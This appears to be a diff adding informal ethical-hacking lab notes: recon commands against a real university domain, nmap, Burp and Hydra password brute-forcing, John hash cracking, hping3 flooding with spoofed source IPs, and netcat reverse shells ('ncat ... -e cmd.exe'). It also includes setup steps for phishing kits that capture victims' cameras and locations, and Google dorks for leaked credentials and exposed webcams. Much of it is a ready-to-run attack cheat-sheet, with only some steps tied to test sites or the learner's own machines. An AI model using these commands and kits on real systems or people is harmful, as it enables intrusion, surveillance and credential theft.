@@ -1,0 +1,291 @@
+OSINT tools to understand the target’s digital footprint and potential exposure.
+1. wappalyzer extension[to identify the technologies, frameworks, and software that a website is built with]
+2. OSINTframework.com [collection of free open-source intelligence (OSINT) tools and resources,publicly available data for various]
+3. idcrawl.com [Search engine that public web info of social media]
+4. spokeo.com [Search engine that public web info of social media]
+5. opencorporates.com [world's largest open database of company information]
+6. virustotal.com [analyzes files, URLs, domains, and IP addresses to detect malware and malicious content using various antivirus engines and website scanners]
+7. ahmia.fi [for the Tor network, making it easier to find hidden services while filtering out illegal content.]
+8. dnsdumpster.com [discover and map a domain's DNS infrastructure, including related hosts, subdomains, and IP addresses]
+9. who.is [registration information,domain,IP,ownership,all detail]
+========================================================================
+passive reconnaissance w/o active interaction.
+1. whois ljku.edu.in
+2. nslookup ljku.edu.in
+3. dig ljku.edu.in
+4. host ljku.edu.in
+5. dnsrecon -d ljku.edu.in
+6. dnsenum ljku.edu.in
+7. theHarvester -d ljku.edu.in -b all
+========================================================================
+active reconnaissance
+1. dirb ljku.edu.in
+2. ping ljku.edu.in
+3. traceroute ljku.edu.in
+4. sublist3r -d ljku.edu.in
+5. amass -d ljku.edu.in
+6. wget link_of_file_to_download.pdf
+========================================================================
+Nmap
+1 nmap 192.168.1.1	 Check if host is active and scan 1000 ports
+2 nmap 192.168.1.* 	Search for number of hosts in network.
+2 nmap -v 192.168.1.1 	Verbose scan, provides more details.
+3 nmap -vv 192.168.1.1	 Very verbose scan, even more details.
+4 nmap -Pn 192.168.1.1 	Treat host as online, skip host discovery.
+5 nmap –traceroute 192.168.1.1	Perform traceroute after the scan.
+6 nmap -O 192.168.1.1	OS detection scan.
+7 nmap -p 80 192.168.1.1	Scan specific port(s).
+8 nmap -p- 192.168.1.1	Scan all ports (0-65535).
+9 nmap -p 80,443	Scan specific ports (e.g., 80, 443).
+10 nmap -A 192.168.1.1	Comprehensive scan (OS detection, version detection, script scanning, and traceroute).
+11 nmap -sV 192.168.1.1	Version detection scan
+========================================================================
+Zphisher [fake phishing login pages]
+git clone https://github.com/htr-tech/zphisher.git
+cd Zphisher
+chmod 777 zphisher.sh
+./zphisher.sh
+========================================================================
+CamPhish [Camera accesss]
+git clone https://github.com/techchipnet/CamPhish.git
+cd Camphish
+chmod 777 camphish.sh
+./camphish.sh
+========================================================================
+Hound [Hack Location]
+git clone https://github.com/techchipnet/hound.git
+cd hound
+chmod 777 hound.sh
+./hound.sh
+cloudflared tunnel → Y
+=================================================================
+Wireshark
+Start Wireshark and capture the interface with the internet
+Go to the browser and search for http://testphp.vulnweb.com
+Go to the sign-up page and enter credentials.
+Go back to wireshark and apply filter http
+Identify the packets of target website. Right click and go to follow → HTTP stream
+Identify credentials in HTTP request.
+=================================================================
+Burp Suite
+1. Search for “portswigger password list”, open first link, copy the list of passwords and paste it
+in new pass.txt file(Also add “test” in between)
+2. Setup foxyproxy extension
+3. Set foxyproxy settings -> HTTP, 127.0.0.1, 8080
+4. Open burp suite
+5. Go to proxy and turn on intercept
+6. Search for testphp.vulnweb.com
+7. Turn on foxyproxy to HTTP
+8. Go to signup page on testphp.vulnweb.com
+9. Observe the captured HTTP request in burp suite and forward it
+10. Enter username as test and password as any random string.
+11. Observe captured username and password in burp suite.
+12. Right click on the captured packet and send it to the intruder
+13. Go to intruder and select the randomly entered password.
+14. Click on load button and select pass.txt containing list of passwords
+15. Start the attack and observe the response code and size of returning page.
+16. Password with response code “200” is the actual password.
+=================================================================
+Netcat
+1. Run ifconfig on kali linux to identify its IP address (make sure connection is bridged)
+2. Run the command to start listener on Kali: nc -lvnp 4444
+3. Install ncat in windows if not installed.
+4. Run the command in windows to grant access: ncat -nv <kali-ip-address> 4444 -e cmd.exe
+=================================================================
+DDOS Attack
+-1 ICMP mode (like ping) hping3 -1 192.168.1.1
+-2 +UDP mode hping3 -2 -p 53 192.168.1.1
+-S TCP SYN flag (scan) hping3 -S -p 80 192.168.1.1
+-A TCP ACK flag (firewall testing) hping3 -A -p 80 192.168.1.1
+-F TCP FIN flag hping3 -F -p 80 192.168.1.1
+-p <port> Destination port hping3 -S -p 443 192.168.1.1
+-s <port> Source port hping3 -S -s 12345 -p 80 192.168.1.1
+-a <IP> Spoof source IP hping3 -S -a 10.10.10.10 -p 80
+192.168.1.1
+-i u1000 Send packet every 1000µs(1ms)
+hping3 -S -p 80 -i u1000 192.168.1.1
+--flood Flood mode (DoS simulation) hping3 -S --flood -p 80 192.168.1.100
+-V Verbose output hping3 -S -V -p 80 192.168.1.1
+=================================================================
+password cracking
+a) Download rockyou.txt(dictionary file) from the link below.
+Use the command:
+wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+b) Search for md5 hash generator and generate a hash for a normal password, such as 12345678(or any other password present in rockyou.txt)
+c) Go to Kali and enter
+i. nano pass.txt
+ii. Paste the hash of 12345678
+iii. Save with Ctrl+S and exit with Ctrl+X
+d) Perform hash cracking with the command below:
+i. john --wordlist=rockyou.txt hashfile.txt --format=raw-MD5
+e) Repeat steps from b) to d) for NTLM and SHA256 hash passwords
+=================================================================
+ZAP web-application security
+1. Open the OWASP ZAP tool
+2. Select automated scan
+3. Enter URL: http://testphp.vulnweb.com/login.php
+a. Select traditional spider
+4. Click on analyze on the toolbar → open scan policy manager
+a. Remove unnecessary policies
+b. Click on add to create a new policy → give a name to the policy
+c. Select vulnerability types from the left to add to in scan policy → OK
+5. Start the scanning by clicking on the attack
+6. Analyze the sitemap created by scanning on left side’s sites option.
+7. Analyze the High priority, Medium priority, Low priority, and informational priority alerts
+a. Note their Evidence, CWE ID, Description, Solution, and references
+=================================================================
+CrypTool :
+Caesar
+2. Encrypt the message using the Caesar cipher algorithm(choose a key of your choice)
+3. Decrypt the ciphertext to recover the original message
+4. Manipulate the key or cipher text to analyze the result of manipulation
+Substitution
+6. Encrypt the message using the Substitution cipher algorithm(choose a key of your choice)
+7. Decrypt the ciphertext to recover the original message
+8. Manipulate the key or cipher text to analyze the result of manipulation
+Playfair
+10. Encrypt the message using the Playfair cipher algorithm(choose a key of your choice)
+11. Decrypt the ciphertext to recover the original message
+12. Manipulate the key or cipher text to analyze the result of the manipulation
+RSA
+1. Enter confidential details in the message box.
+2. Encrypt the message using the RSA algorithm(select a key generated by cryptool)
+3. Decrypt the ciphertext to recover the original message(Enter PIN=1234)
+4. Manipulate the key or cipher text to analyze the result of the manipulation
+5. Enter confidential details in the message box.
+6. Click on digital signature → sign document
+a. Select a hash algorithm and encryption algorithm(EC-prime or RSA) and enter PIN=1234
+7. Click on digital signature → verify signature
+8. Manipulate the digital signature or original document to analyze the result of the manipulation
+=================================================================
+RMail
+1. Search for the Rmail extension for Chrome.
+2. Add Rmail extension for Chrome
+3. Open Gmail → Activate Rmail → choose account → allow all permissions.
+4. Compose mail → on the bottom, there is an option to encrypt → select Custom and create a
+password → send mail(red color)
+5. Check on the receiver’s side → observe the password-protected PDF file consisting of mail
+data. → Enter the password and retrieve the originally sent data.
+6. —-------------------------------------------------------------------------------------------
+7. Compose mail → on the bottom, there is an option to E-sign → send mail(red color)
+8. Check on the receiver’s side → observe the digitally-signed PDF file consisting of mail data
+=================================================================
+SSH brute-force
+1. In Windows, go to optional features and add the OpenSSH server.
+2. In Windows, go to Services and start the OpenSSH server
+a. Create inbound firewall rule allowing traffic on port 22 IF NECESSARY
+3. notedown ipaddress of windows from cmd→ipconfig/all
+4. In Kali Linux,
+a. Perform nmap ip_of_windows (to find open ports→you will see port 22 open)
+b. Run Hydra to perform a dictionary attack on the SSH service.
+i. hydra -l “windows username” -P rockyou.txt ssh://windows_ip -v
+ii. (add your actual password in rockyou.txt if it doesn’t crack)
+c. Get SSH access,
+i. ssh Windows_username@windows_ip
+1. (You will be asked for a password. Enter the cracked password)
+d. Create a folder named “ssh_exploited” using mkdir
+=================================================================
+Google dorking 
+
+site:ljku.edu.in 
+site:ljku.edu.in inurl:database [specific word in url]
+site:ljku.edu.in filetype:pdf [specific file type]
+site:ljku.edu.in intext:chintan [specific word in]
+site:ljku.edu.in intext:chintan+mahipal [specific word in]
+site:ljku.edu.in intext:chintan -nayan [specific word hona chiye or - se nahi hone chiye]
+site:ljku.edu.in "index of/" "backup" [specific file]
+site:ljku.edu.in intitle:"index" "ftp"[specific file]
+config intitle
+exploit-db.com website [for any malicious present query]
+dorksearch.com[for find any malicious file]
+index.of.dcim [for cam access]
+intext webcam x5 [for cam access]
+
+site: → Restrict results to a specific domain or subdomain.
+inurl: → Search for keywords within a page’s URL.
+allinurl: → Search for multiple terms within the URL.
+intitle: → Find pages with a keyword in the title tag.
+allintitle: → Search for multiple terms in the title.
+intext: → Look for specific text inside the page body.
+allintext: → Search for multiple terms inside the page body.
+filetype: / ext: → Find files of a specific extension (e.g., PDF, SQL, ENV).
+cache: → Show Google’s cached version of a page.
+related: → Find websites similar to a given domain.
+link: → Show pages linking to a specific URL (limited results nowadays).
+info: → Display summary information about a site (cache, similar pages, etc.).
+define: → Show Google’s definition of a word.
+daterange: → Search for pages indexed between two dates (requires Julian dates).
+source: → Restrict results to a specific news source (Google News only).
+map: → Trigger Google Maps results.
+weather: → Weather info for a location.
+
+→ Boolean & Advanced Modifiers
+OR → Search for either one term or another.
+AND → Ensure both terms are included (Google assumes AND by default).
+- → Exclude specific words from search.
+* → Wildcard operator (matches anything).
+"" → Exact match search for a phrase.
+.. → Search within a numeric range (e.g., 2020..2023).
+
+→Login Pages & Admin Panels
+site:target.com inurl:login
+site:target.com inurl:admin
+site:target.com i n
+site:target.com inurl:portal
+site:target.com intitle:"login"
+
+→Exposed Directories & Indexes
+site:target.com intitle:"index of"
+site:target.com "index of /" "backup"
+site:target.com "index of /" "config"
+site:target.com "index of /" "database"
+site:target.com intitle:"index of" inurl:ftp
+
+→Sensitive Files & Credentials
+site:target.com filetype:sql
+site:target.com filetype:log
+site:target.com filetype:env
+site:target.com filetype:pdf
+site:target.com filetype:bak
+
+→Employee Data & Credentials
+site:target.com filetype:xls password
+site:target.com filetype:csv email
+site:target.com filetype:txt password
+site:target.com filetype:pdf "confidential"
+site:target.com filetype:doc "internal use only"
+
+1. site:target.com filetype:xls OR filetype:csv "password"
+2. inurl:/view/view.shtml
+2. intext: webcam 5 xp
+3. site:target.com intitle:"index of"
+	# Google Dork: intitle:index of /etc/ssh
+4. site:target.com inurl:login
+5. index.of.dcim (Digital Camera Image dumps)
+6. intitle:”Index Of” -inurl:maillog maillog size
+7. "Config" intitle:"Index of" intext:vpn
+========================================================================
+Access CMD :
+Opan Kali CMD
+ifconfig
+copy IP
+kali cmd :  nc -lvnp 4445
+Open CMD od PC
+ncat -nv 10.60.217.9 4445 -e cmd.exe
+now this PC's CMD access in Kali's Terminal and can do anything
+=================================================================
+Access CMD
+start ssh in laptop
+serch optinonal feture
+find openssh server add it
+ 
+ifconfig
+nmap 192.168.0.133.* -sn
+sudo nmap.3 IP -sV
+hydra -L users.txt
+hydra -l "username" -P pw.txt
+OR
+hydra -l "username" -P pw.txt ssh://IP.3 -v
+ssh username@IP.3 - > PW
+
+
